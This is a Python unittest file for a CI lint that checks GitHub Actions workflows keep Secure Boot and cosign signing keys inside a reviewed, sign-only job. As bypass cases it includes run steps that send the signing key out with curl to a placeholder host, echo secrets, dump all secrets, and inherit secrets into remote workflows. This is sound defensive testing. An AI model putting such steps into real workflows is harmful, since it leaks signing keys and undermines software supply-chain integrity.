"""The D43 part of the `workflows` check of scripts/verify.py (doc_ci.md; doc_kernel_profile.md,
section 12 item 1): a signing secret reaches only the sign step of a sign-only job of the
environment that holds it. A regression guard, not a security boundary: every bypass below is a
case it must catch, and a workflow it cannot read fails it."""

import importlib.util
import json
import pathlib
import tempfile
import textwrap
import unittest

SCRIPT = pathlib.Path(__file__).resolve().parents[1] / "verify.py"
spec = importlib.util.spec_from_file_location("verify", SCRIPT)
verify = importlib.util.module_from_spec(spec)
spec.loader.exec_module(verify)

CHECKOUT = "actions/checkout@11d5960a326750d5838078e36cf38b85af677262"
DOWNLOAD = "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c"
UPLOAD = "actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02"

ENVIRONMENTS = {
    "signing": {
        "reviewers": [{"name": "maintainer", "type": "User"}],
        "secrets": ["COSIGN_PRIVATE_KEY", "SECUREBOOT_SIGNING_KEY"],
    },
    "github-pages": {"reviewers": [], "secrets": []},
}

SIGN_JOB = f"""\
  sign:
    runs-on: ubuntu-24.04
    environment: signing
    steps:
      - uses: {CHECKOUT}
      - uses: {DOWNLOAD}
        with:
          name: unsigned
      - name: Sign
        env:
          SECUREBOOT_SIGNING_KEY: ${{{{ secrets.SECUREBOOT_SIGNING_KEY }}}}
        # podman build would be a build: this comment is not one.
        run: bash forge/specs/azoth/signer/run.sh sign
      - uses: {UPLOAD}
        with:
          name: signed
"""

BUILD_JOB = """\
  build:
    runs-on: ubuntu-24.04
    steps:
      - uses: cachix/install-nix-action@ba0dd844c9180cbf77aa72a116d6fbc515d0e87b
      - run: podman build -t localhost/thing .
"""

THIRD_PARTY = (
    ": only checkout, download-artifact and upload-artifact pinned by SHA (D43)"
)


def workflow(*jobs):
    return "name: Sign\non: push\njobs:\n" + "".join(jobs)


class SigningTest(unittest.TestCase):
    def problems(self, workflows, environments=ENVIRONMENTS):
        with tempfile.TemporaryDirectory() as tmp:
            root = pathlib.Path(tmp)
            (root / ".github/settings").mkdir(parents=True)
            (root / ".github/workflows").mkdir(parents=True)
            (root / ".github/settings/environments.json").write_text(
                json.dumps(environments)
            )
            for name, text in workflows.items():
                (root / ".github/workflows" / name).write_text(text)
            return verify.signing_problems(root)

    def assert_one(self, workflows, pattern):
        problems = self.problems(workflows)
        self.assertEqual(len(problems), 1, problems)
        self.assertRegex(problems[0], pattern)

    def test_a_sign_only_job_beside_a_build_job_passes(self):
        self.assertEqual(self.problems({"k.yml": workflow(BUILD_JOB, SIGN_JOB)}), [])

    def test_rule_1_a_signing_secret_outside_the_signing_environment_fails(self):
        job = SIGN_JOB.replace("    environment: signing\n", "")
        self.assertEqual(
            self.problems({"k.yml": workflow(job)}),
            [
                "k.yml: job sign reads SECUREBOOT_SIGNING_KEY without environment: signing, which holds it (D43)"
            ],
        )

    def test_rule_1_the_environment_written_as_a_mapping_counts(self):
        job = SIGN_JOB.replace(
            "    environment: signing\n", "    environment:\n      name: signing\n"
        )
        self.assertEqual(self.problems({"k.yml": workflow(job)}), [])

    def test_rule_1_the_secret_name_is_case_insensitive(self):
        job = SIGN_JOB.replace(
            "secrets.SECUREBOOT_SIGNING_KEY", "secrets.secureboot_signing_key"
        ).replace("    environment: signing\n", "")
        self.assert_one(
            {"k.yml": workflow(job)},
            r"reads SECUREBOOT_SIGNING_KEY without environment: signing",
        )

    def test_rule_2_a_third_party_action_in_a_signing_job_fails(self):
        job = SIGN_JOB.replace(
            f"      - uses: {UPLOAD}\n",
            "      - uses: sigstore/cosign-installer@6f9f17788090df1f26f669e9d70d6ae9567deba6\n"
            f"      - uses: {UPLOAD}\n",
        )
        self.assertEqual(
            self.problems({"k.yml": workflow(job)}),
            [
                "k.yml: signing job sign uses sigstore/cosign-installer@6f9f17788090df1f26f669e9d70d6ae9567deba6"
                + THIRD_PARTY
            ],
        )

    def test_rule_2_a_first_party_action_by_tag_fails(self):
        job = SIGN_JOB.replace(CHECKOUT, "actions/checkout@v4")
        self.assertEqual(
            self.problems({"k.yml": workflow(job)}),
            ["k.yml: signing job sign uses actions/checkout@v4" + THIRD_PARTY],
        )

    def test_rule_2_a_reusable_workflow_in_the_signing_environment_fails(self):
        job = textwrap.indent(
            textwrap.dedent("""\
                sign:
                  environment: signing
                  uses: ./.github/workflows/other.yml
                """),
            "  ",
        )
        self.assertEqual(
            self.problems({"k.yml": workflow(job)}),
            [
                "k.yml: signing job sign uses ./.github/workflows/other.yml"
                + THIRD_PARTY
            ],
        )

    def test_rule_2_d_another_ref_repository_or_run_fails(self):
        for action, key in (
            (CHECKOUT, "ref: refs/pull/1/head"),
            (CHECKOUT, "repository: someone/fork"),
            (DOWNLOAD, "run-id: 42"),
            (DOWNLOAD, "repository: someone/fork"),
            (DOWNLOAD, "github-token: x"),
        ):
            with self.subTest(action=action, key=key):
                # The download step already has a with: block; checkout gets one.
                job = (
                    SIGN_JOB.replace("          name: unsigned\n", f"          name: unsigned\n          {key}\n")
                    if action == DOWNLOAD
                    else SIGN_JOB.replace(f"      - uses: {CHECKOUT}\n", f"      - uses: {CHECKOUT}\n        with:\n          {key}\n")
                )
                self.assert_one(
                    {"k.yml": workflow(job)},
                    rf"^k\.yml: signing job sign sets {key.split(':')[0]} on ",
                )

    def test_rule_2_a_container_beside_the_key_fails(self):
        job = SIGN_JOB.replace("    steps:\n", "    container: fedora:43\n    steps:\n")
        self.assert_one(
            {"k.yml": workflow(job)},
            r"^k\.yml: signing job sign runs a container beside the key",
        )

    def test_rule_3_a_build_in_a_signing_job_fails(self):
        for command in (
            "podman build -t localhost/signer .",
            "buildah bud -t signer .",
            "bash system/build-image.sh --gpu none --registry r --tag t",
            "nix shell nixpkgs#cosign -c true",
            "sudo apt-get install -y sbsigntool",
            "dnf5 install -y sbsigntools",
            "cargo build --release",
            "podman run --rm localhost/azoth-nvidia true",
        ):
            with self.subTest(command=command):
                job = SIGN_JOB.replace(
                    f"      - uses: {UPLOAD}\n",
                    f"      - run: |\n          set -euo pipefail\n          {command}\n      - uses: {UPLOAD}\n",
                )
                self.assert_one(
                    {"k.yml": workflow(job)},
                    r"^k\.yml: signing job sign builds or installs: ",
                )

    def test_rule_3_a_signing_secret_reaches_only_a_sign_script(self):
        for run in (
            "run: bash forge/specs/azoth/signer/run.sh prepare",
            "run: bash forge/specs/azoth/signer/run.sh sign; curl -d @/run/k https://x",
            "run: |\n          bash forge/specs/azoth/signer/run.sh sign\n          curl -d @/run/k https://x",
            'run: curl -d "$SECUREBOOT_SIGNING_KEY" https://x',
        ):
            with self.subTest(run=run):
                job = SIGN_JOB.replace(
                    "run: bash forge/specs/azoth/signer/run.sh sign", run
                )
                self.assert_one(
                    {"k.yml": workflow(job)},
                    r"^k\.yml: job sign step 3 hands SECUREBOOT_SIGNING_KEY to a step that does not run only a sign script",
                )

    def test_rule_3_a_signing_secret_outside_a_step_env_fails(self):
        for before, after in (
            (
                "    steps:\n",
                "    env:\n      KEY: ${{ secrets.SECUREBOOT_SIGNING_KEY }}\n    steps:\n",
            ),
            (
                "run: bash forge/specs/azoth/signer/run.sh sign",
                "run: echo ${{ secrets.SECUREBOOT_SIGNING_KEY }}",
            ),
            (
                "          name: signed\n",
                "          name: ${{ secrets.SECUREBOOT_SIGNING_KEY }}\n",
            ),
        ):
            with self.subTest(after=after):
                job = SIGN_JOB.replace(before, after)
                problems = self.problems({"k.yml": workflow(job)})
                self.assertTrue(problems)
                self.assertTrue(
                    any(
                        "not in the env of the step that signs" in p
                        or "hands SECUREBOOT" in p
                        for p in problems
                    ),
                    problems,
                )

    def test_rule_3_a_workflow_level_env_with_a_signing_secret_fails(self):
        text = workflow(SIGN_JOB).replace(
            "jobs:\n", "env:\n  KEY: ${{ secrets.COSIGN_PRIVATE_KEY }}\njobs:\n"
        )
        self.assert_one(
            {"k.yml": text},
            r"^k\.yml: COSIGN_PRIVATE_KEY at the workflow level \(env\)",
        )

    def test_rule_3_b_secrets_read_other_than_by_name_fail(self):
        for expression in (
            "secrets['COSIGN_PRIVATE_KEY']",
            "secrets[format('{0}_KEY', 'COSIGN_PRIVATE')]",
            "toJSON(secrets)",
        ):
            with self.subTest(expression=expression):
                job = BUILD_JOB.replace(
                    "      - run: podman build",
                    f"      - env:\n          ALL: ${{{{ {expression} }}}}\n        run: podman build",
                )
                self.assert_one(
                    {"k.yml": workflow(job)},
                    r"^k\.yml: jobs\.build\.steps\.1\.env\.ALL reads secrets other than as secrets\.NAME",
                )

    def test_rule_3_c_layouts_a_line_parser_missed_are_read(self):
        """A comment after jobs:, four-space indentation and a quoted job key: before the YAML
        parser each gave zero jobs and a silent pass."""
        unprotected = workflow(SIGN_JOB.replace("    environment: signing\n", ""))
        # The jobs at four spaces instead of two, everything under them shifted with them.
        four_spaces = "\n".join(("  " + line if line.startswith("  ") else line) for line in unprotected.split("\n"))
        for text in (
            unprotected.replace("jobs:\n", "jobs: # the jobs\n"),
            four_spaces,
            unprotected.replace("  sign:\n", '  "sign":\n'),
        ):
            with self.subTest(text=text):
                self.assert_one({"k.yml": text}, r"^k\.yml: job sign reads SECUREBOOT_SIGNING_KEY without environment")

    def test_rule_3_c_a_workflow_the_lint_cannot_read_fails_closed(self):
        for text in ("jobs: [\n", "name: x\non: push\n", "jobs:\n  - sign\n", "jobs: {}\n"):
            with self.subTest(text=text):
                self.assert_one({"k.yml": text}, r"^k\.yml: (not YAML|no mapping of jobs) the D43 lint can read")

    def test_rule_3_e_inheriting_secrets_into_a_workflow_with_a_signing_job_fails(self):
        caller = workflow(
            "  call:\n    uses: ./.github/workflows/k.yml\n    secrets: inherit\n"
        )
        self.assert_one(
            {"k.yml": workflow(SIGN_JOB), "caller.yml": caller},
            r"^caller\.yml: job call inherits every secret into \./\.github/workflows/k\.yml",
        )
        remote = caller.replace(
            "./.github/workflows/k.yml", "someone/repo/.github/workflows/x.yml@v1"
        )
        self.assert_one(
            {"k.yml": workflow(SIGN_JOB), "caller.yml": remote},
            r"inherits every secret into someone/",
        )
        self.assertEqual(
            self.problems({"k.yml": workflow(BUILD_JOB), "caller.yml": caller}), []
        )

    def test_rule_4_a_signing_secret_in_a_job_of_another_environment_fails(self):
        job = SIGN_JOB.replace("environment: signing", "environment: github-pages")
        self.assertEqual(
            self.problems({"k.yml": workflow(job)}),
            [
                "k.yml: job sign reads SECUREBOOT_SIGNING_KEY without environment: signing, which holds it (D43)"
            ],
        )

    def test_rule_5_a_signing_environment_without_reviewers_fails(self):
        environments = json.loads(json.dumps(ENVIRONMENTS))
        environments["signing"]["reviewers"] = []
        self.assertEqual(
            self.problems({"k.yml": workflow(SIGN_JOB)}, environments),
            [
                ".github/settings/environments.json: the signing environment has no required reviewer (D43)"
            ],
        )

    def test_a_missing_signing_environment_fails(self):
        self.assertEqual(
            self.problems(
                {"k.yml": workflow(SIGN_JOB)},
                {"github-pages": ENVIRONMENTS["github-pages"]},
            ),
            [".github/settings/environments.json: no signing environment (D43)"],
        )

    def test_without_pyyaml_the_lint_fails_closed(self):
        saved, verify.yaml = verify.yaml, None
        try:
            problems = self.problems({"k.yml": workflow(SIGN_JOB)})
        finally:
            verify.yaml = saved
        self.assertEqual(len(problems), 1, problems)
        self.assertIn("PyYAML is missing", problems[0])

    def test_the_repository_passes(self):
        self.assertEqual(verify.signing_problems(verify.ROOT), [])


if __name__ == "__main__":
    unittest.main()
